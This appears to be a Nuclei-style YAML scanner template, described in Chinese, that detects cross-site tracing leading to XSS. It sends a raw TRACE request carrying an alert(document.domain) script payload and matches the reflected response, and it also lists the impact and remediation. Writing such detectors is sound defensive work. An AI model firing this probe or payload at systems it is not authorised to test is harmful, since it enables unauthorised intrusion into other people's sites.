id: cross-site-tracing-xss

info:
  name: 跨站追踪引发的跨站脚本漏洞
  author: ritikchaddha
  severity: low
  description: |
    该模板用于检测 跨站追踪引发的跨站脚本漏洞。该类漏洞通常源于页面未对用户输入进行正确过滤或输出编码，导致脚本内容被浏览器执行。模板主要向 `/` 等路径发送探测请求，并根据响应中的 `Header: <script>alert(document.domain)</script>`、`TRACE` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可诱导用户访问构造链接或页面，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、执行越权操作、篡改页面内容，或作为钓鱼和横向攻击链的一环。
  remediation: |
    - 对所有反射或存储到页面的用户输入进行上下文相关输出编码。
    - 对富文本、URL、HTML 属性等高风险输入使用白名单过滤，并启用合适的 Content-Security-Policy。
    - 升级受影响组件，检查是否存在被植入的恶意脚本或异常后台操作。
  reference:
    - https://medium.com/@tushar_rs_/cross-site-tracing-attack-xst-5aa519658b7a
    - https://www.owasp.org/index.php/Cross_Site_Tracing
  classification:
    cwe-id: CWE-80
  metadata:
    max-request: 1
  tags: xss,trace,generic

http:
  - raw:
      - |
        TRACE / HTTP/1.1
        Host: {{Hostname}}
        Header: <script>alert(document.domain)</script>
        Content-Length: 27

        <script>alert(document.domain)</script>

    matchers-condition: and
    matchers:
      - type: word
        part: response
        words:
          - "Header: <script>alert(document.domain)</script>"
          - "TRACE"
        condition: and

      - type: word
        part: header
        words:
          - "text/html"
          - "message/http"

      - type: status
        status:
          - 200
